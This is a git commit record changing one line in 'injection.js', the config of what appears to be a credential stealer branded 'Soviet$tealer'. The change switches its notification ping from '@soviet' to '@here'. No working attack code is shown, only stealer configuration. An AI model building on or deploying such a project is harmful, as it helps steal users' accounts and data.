4682da77a9840e1a646d5781fc114c6f31f07ee9
82493792f <145818108+82493792f@users.noreply.github.com>
2023-09-28 02:29:55 +0300

    Update injection.js

--- injection.js
+++ injection.js
@@ -20,7 +20,7 @@ var config = {
 
     notify_on_logout: true,
     notify_on_initialization: true,
-    ping: [true, "@soviet"],
+    ping: [true, "@here"],
 
     embed: {
         username: "Soviet$tealer | Deadly Projects ®",
